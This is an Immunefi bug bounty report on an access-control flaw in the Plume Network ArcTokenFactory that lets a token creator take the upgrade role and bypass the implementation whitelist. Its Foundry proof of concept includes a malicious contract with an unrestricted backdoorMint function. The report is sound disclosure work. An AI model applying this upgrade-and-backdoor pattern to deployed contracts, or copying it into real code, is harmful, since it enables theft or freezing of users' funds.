# 52649 sc high token creator can seize upgrade control bypassing factory whitelist and enabling theft of funds

**Submitted on Aug 12th 2025 at 09:30:55 UTC by @hulkvision for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #52649
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/arc/src/ArcTokenFactory.sol>
* **Impacts:**
  * Permanent freezing of funds
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Unauthorized upgrade of ArcToken implementation

## Description

### Brief / Intro

The `ArcTokenFactory` contract incorrectly grants the `DEFAULT_ADMIN_ROLE` of a newly created `ArcToken` to the token's creator (`msg.sender`). This allows the creator to subsequently grant themselves the `UPGRADER_ROLE`. By seizing the `UPGRADER_ROLE`, the token creator can unilaterally upgrade the `ArcToken` proxy to a malicious implementation at any time, completely bypassing the factory's intended security whitelist. This enables the creator to take full control of the token implementation, which can lead to the direct theft of all user funds held within the token contract or the permanent freezing of those assets.

### Vulnerability Details

The ArcTokenFactory is intended to be the sole upgrader for tokens it creates, enforcing upgrades only to pre-approved, whitelisted implementations by granting the `UPGRADER_ROLE` to the factory. However, the factory mistakenly grants the `DEFAULT_ADMIN_ROLE` to the token creator, enabling the creator to assign the `UPGRADER_ROLE` to themselves.

Relevant excerpt from `createToken` (ArcTokenFactory.sol):

```solidity
// ArcTokenFactory.sol
function createToken(...) ... {
    // ...
    // Grant the DEFAULT_ADMIN_ROLE to the deployer
    token.grantRole(token.DEFAULT_ADMIN_ROLE(), msg.sender);
    // ...
    token.grantRole(token.UPGRADER_ROLE(), address(this));
}
```

* The token creator, having `DEFAULT_ADMIN_ROLE`, can call `grantRole(UPGRADER_ROLE, creator_address)` on their own token contract because `DEFAULT_ADMIN_ROLE` is the admin role for `UPGRADER_ROLE`.
* Once the creator has the `UPGRADER_ROLE`, they can call `upgradeToAndCall()` directly on the ArcToken proxy, bypassing the factory's `upgradeToken` function and its `isImplementationWhitelisted` check.

### Impact Details

* The token deployer gains the ability to replace the token logic with a malicious implementation, enabling theft of user funds or permanent freezing of assets.
* This breaks the core trust model of the Arc framework: users interacting with factory-created tokens assume upgrades are restricted to vetted, whitelisted implementations enforced by the factory.

## Proof of Concept

{% stepper %}
{% step %}

### Setup and Initial Exploit Flow

The following test demonstrates the full exploit flow:

* Attacker creates a token via the factory and is granted `DEFAULT_ADMIN_ROLE`.
* Attacker grants themselves the `UPGRADER_ROLE`.
* Attacker deploys a malicious logic contract and calls `upgradeToAndCall()` on the token proxy.
* The malicious implementation includes a backdoor function (e.g., `backdoorMint`) to mint tokens to arbitrary users.

Add the test below to `arc/test/ArcTokenFactory.t.sol` and run: forge test --mt test\_Bypass\_TokenCreatorCanUpgradeArcToken -vvvv
{% endstep %}

{% step %}

### Malicious Logic & Test Code

```solidity
contract MaliciousArcToken is ArcToken {
    function backdoorMint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

function test_Bypass_TokenCreatorCanUpgradeArcToken() public {
    vm.startPrank(attacker);
    address tokenProxyAddress = factory.createToken(
        "Legit Token", "LGT", 1000e18, address(0), "uri", attacker, 18
    );
    ArcToken token = ArcToken(tokenProxyAddress);
    console.log("Step 1: Attacker created a token. Attacker is the DEFAULT_ADMIN_ROLE.");
    // --- 2. Verify Initial State ---
    // The factory should be the upgrader initially.
    assertTrue(token.hasRole(token.UPGRADER_ROLE(), address(factory)), "Factory should initially be the upgrader.");
    assertFalse(token.hasRole(token.UPGRADER_ROLE(), attacker), "Attacker should NOT initially be the upgrader.");
    console.log("Step 2: Initial roles verified. Factory is the upgrader.");

    // --- 3. Attacker grants themselves the UPGRADER_ROLE ---
    // Because the attacker has DEFAULT_ADMIN_ROLE, they can grant any role.
    console.log("Step 3: Attacker grants UPGRADER_ROLE to themselves...");
    token.grantRole(token.UPGRADER_ROLE(), attacker);
    vm.stopPrank();

    // --- 4. Verification of Bypass 
    assertTrue(token.hasRole(token.UPGRADER_ROLE(), attacker), "Bypass failed: Attacker could not grant themselves UPGRADER_ROLE.");
    console.log("Step 4: Bypass successful. Attacker now has UPGRADER_ROLE.");

    console.log("Step 5: Attacker deploys and upgrades to a malicious token contract...");
    MaliciousArcToken maliciousLogic = new MaliciousArcToken();

    // This call bypasses the factory's `upgradeToken` and its whitelist check.
    vm.startPrank(attacker);
    token.upgradeToAndCall(address(maliciousLogic), "");
    vm.stopPrank();

    console.log("Step 6: Exploiting the backdoor in the new implementation...");
    MaliciousArcToken maliciousToken = MaliciousArcToken(tokenProxyAddress);
    uint256 victimBalanceBefore = maliciousToken.balanceOf(user);
    assertEq(victimBalanceBefore, 0);

    // Anyone (the victim in this case) can now call the backdoor function.
    vm.prank(user);
    maliciousToken.backdoorMint(user, 1_000_000e18);

    uint256 victimBalanceAfter = maliciousToken.balanceOf(user);
    assertEq(victimBalanceAfter, 1_000_000e18, "Malicious mint failed.");
    console.log("Step 7: Exploit successful. Victim minted tokens via the backdoor.");
}
```

{% endstep %}
{% endstepper %}

## References

<details>

<summary>Source reference</summary>

<https://github.com/immunefi-team/attackathon-plume-network/blob/580cc6d61b08a728bd98f11b9a2140b84f41c802/arc/src/ArcTokenFactory.sol#L191-L193>

</details>
